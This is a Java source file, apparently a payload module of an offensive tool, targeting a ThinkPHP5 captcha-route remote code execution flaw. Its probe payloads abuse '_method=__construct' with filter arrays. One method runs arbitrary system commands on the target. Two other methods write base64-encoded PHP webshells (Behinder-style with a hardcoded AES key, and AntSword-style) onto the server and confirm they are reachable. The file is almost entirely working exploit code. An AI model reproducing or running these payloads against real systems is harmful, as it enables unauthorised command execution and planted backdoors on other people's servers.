package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;

import java.util.ArrayList;

public class TP5CaptchaRce implements PayloadTemplate {
    StringBuffer payload1 = new StringBuffer();
    StringBuffer payload2 = new StringBuffer();
    StringBuffer payload3 = new StringBuffer();
    final ArrayList<StringBuffer> payloadList = new ArrayList<>(){{
        //_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
        add(payload1.append("_method=__construct&").append("filter[]=phpinfo&").append("method=get&").append("server[REQUEST_METHOD]=1"));
        //_method=__construct&filter[]=phpinfo&method=GET&get[]=1
        add(payload2.append("_method=__construct&").append("filter[]=phpinfo&").append("method=get&").append("get[]=1"));
        //_method=__construct&filter[]=call_user_func&method=get&get[0]=phpinfo
        add(payload3.append("_method=__construct&").append("filter[]=call_user_func&").append("method=get&").append("get[0]=phpinfo"));
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        try {
            for (StringBuffer payload : payloadList) {
                String postUrl = url + "?s=captcha";
                String result = UrlUtils.doPost(postUrl, payload);
                if (result == null) {
                    continue;
                }
                if (result.contains("PHP Version")) {
                    return new ResultUtils(true, "ThinkPHP5 Captcha路由RCE", "url: " + url + "?s=captcha; post: " + payload.toString());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP5 Captcha路由RCE", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        try {
            String postUrl = url + "?s=captcha";
            StringBuffer payload = new StringBuffer();
            payload.append("_method=__construct&").append("filter[]=system&").append("method=get&").append("server[REQUEST_METHOD]=").append(command);
            String result = UrlUtils.doPost(postUrl, payload);
            assert result != null;
            if (!result.equals("")) {
                return new ResultUtils(true, "", result.substring(0, result.indexOf("<!DOCTYPE")));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        String postUrl = url + "?s=captcha";
        String base64Shell = "echo \"PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKCQlmdW5jdGlvbiBEZWNyeXB0KCRkYXRhKQoJewoJCSRrZXk9ImU0NWUzMjlmZWI1ZDkyNWIiOyAvL%2BivpeWvhumSpeS4uui%2FnuaOpeWvhueggTMy5L2NbWQ15YC855qE5YmNMTbkvY3vvIzpu5jorqTov57mjqXlr4bnoIFyZWJleW9uZAoJCXJldHVybiBvcGVuc3NsX2RlY3J5cHQoYmFzZTY0X2RlY29kZSgkZGF0YSksICJBRVMtMTI4LUVDQiIsICRrZXksT1BFTlNTTF9QS0NTMV9QQURESU5HKTsKCX0KCSRwb3N0PURlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0IikpOwogICAgZXZhbCgkcG9zdCk7Cj8%2B\" | base64 -d > tp_behinder.php".replace(" ", "%20");
        try {
            StringBuffer payload = new StringBuffer();
            payload.append("_method=__construct&").append("filter[]=system&").append("method=get&").append("server[REQUEST_METHOD]=").append(base64Shell);
            UrlUtils.doPost(postUrl, payload);
            String result = UrlUtils.doGet(url + "tp_behinder.php");
            if (result != null) {
                return new ResultUtils(true, "", url + "tp_behinder.php");
            };
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        String postUrl = url + "?s=captcha";
        String base64Shell = "echo PD9waHAKJGE9YXJyYXkoJF9SRVFVRVNUWyd0cCddPT4iMyIpOwokYj1hcnJheV9rZXlzKCRhKVswXTsKZXZhbCgkYik7Cj8%2B | base64 -d > tp_antsword.php".replace(" ", "%20");
        try {
            StringBuffer payload = new StringBuffer();
            payload.append("_method=__construct&").append("filter[]=system&").append("method=get&").append("server[REQUEST_METHOD]=").append(base64Shell);
            UrlUtils.doPost(postUrl, payload);
            String result = UrlUtils.doGet(url + "tp_antsword.php");
            if (result != null) {
                return new ResultUtils(true, "", url + "tp_antsword.php");
            };
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

}
